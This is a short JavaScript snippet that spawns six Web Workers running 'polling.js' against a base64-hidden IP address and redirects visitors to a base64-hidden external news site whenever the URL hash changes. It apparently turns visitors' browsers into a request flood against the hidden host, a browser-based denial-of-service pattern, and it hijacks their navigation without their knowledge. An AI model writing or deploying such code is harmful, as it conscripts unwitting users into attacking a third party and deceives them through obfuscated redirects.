
Array.from({length: 6}).forEach(() => {
  var pollingWorker = new Worker('polling.js');
  pollingWorker.postMessage('aHR0cHM6Ly8xNzguMjQ4LjIzNC43Ng==');
})

window.addEventListener('hashchange', function () {
  window.location = atob('aHR0cHM6Ly9tb3Njb3ctbmV3cy10b2RheS5uZXRsaWZ5LmFwcC8=');
})